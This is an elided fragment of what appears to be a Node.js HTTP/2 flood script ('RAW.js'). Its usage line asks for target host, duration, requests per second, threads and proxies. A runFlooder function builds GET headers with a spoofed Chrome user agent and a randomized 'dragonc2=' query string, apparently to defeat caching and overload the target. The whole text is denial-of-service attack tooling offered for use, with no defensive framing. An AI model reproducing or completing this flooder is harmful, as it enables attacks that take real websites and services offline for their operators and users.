const net = require("net");
 ...
 if (process.argv.length < 7){console.log(gradient.vice(`[!] node RAW.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));}
 const headers = {};
...
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
 ...
 function runFlooder() {
     ...
     let headers = {
        ...
        ":method": "GET",
        ":path": parsedTarget.path + "?" + "dragonc2=" + randstr(13),
        ":scheme": "https",
        "accept": accept,
